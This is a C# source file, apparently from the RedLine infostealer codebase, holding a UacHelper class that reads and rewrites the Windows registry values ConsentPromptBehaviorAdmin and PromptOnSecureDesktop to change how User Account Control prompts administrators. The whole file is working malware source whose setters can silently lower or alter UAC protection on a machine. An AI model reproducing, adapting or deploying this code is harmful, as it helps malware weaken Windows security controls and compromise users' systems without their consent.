using Microsoft.Win32;
using RedLine.Models.UAC;
using System;

namespace RedLine.Logic.Helpers
{
	public static class UacHelper
	{
		private const string RegistryAddress = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

		public static AdminPromptType AdminPromptBehavior
		{
			get
			{
				if (Environment.OSVersion.Version.Major < 6)
				{
					return AdminPromptType.AllowAll;
				}
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: false))
					{
						AdminPromptType adminPromptType = AdminPromptType.DimmedPromptForNonWindowsBinaries;
						adminPromptType = (AdminPromptType)((registryKey2?.GetValue("ConsentPromptBehaviorAdmin", adminPromptType) as int?) ?? ((int)adminPromptType));
						if (ForceDimPromptScreen)
						{
							switch (adminPromptType)
							{
							case AdminPromptType.Prompt:
								return AdminPromptType.DimmedPrompt;
							case AdminPromptType.PromptWithPasswordConfirmation:
								return AdminPromptType.DimmedPromptWithPasswordConfirmation;
							}
						}
						return adminPromptType;
					}
				}
			}
			set
			{
				if (value != AdminPromptBehavior)
				{
					using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
					{
						using (RegistryKey registryKey2 = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true))
						{
							if (ForceDimPromptScreen)
							{
								if (value == AdminPromptType.Prompt)
								{
									value = AdminPromptType.DimmedPrompt;
								}
								if (value == AdminPromptType.PromptWithPasswordConfirmation)
								{
									value = AdminPromptType.DimmedPromptWithPasswordConfirmation;
								}
							}
							registryKey2?.SetValue("ConsentPromptBehaviorAdmin", (int)value);
						}
					}
				}
			}
		}

		public static bool ForceDimPromptScreen
		{
			get
			{
				if (Environment.OSVersion.Version.Major < 6)
				{
					return false;
				}
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: false))
					{
						return ((registryKey2?.GetValue("PromptOnSecureDesktop", 0) as int?) ?? 0) > 0;
					}
				}
			}
			set
			{
				if (value != ForceDimPromptScreen)
				{
					using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
					{
						using (RegistryKey registryKey2 = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true))
						{
							registryKey2?.SetValue("PromptOnSecureDesktop", value ? 1 : 0);
						}
					}
				}
			}
		}
	}
}
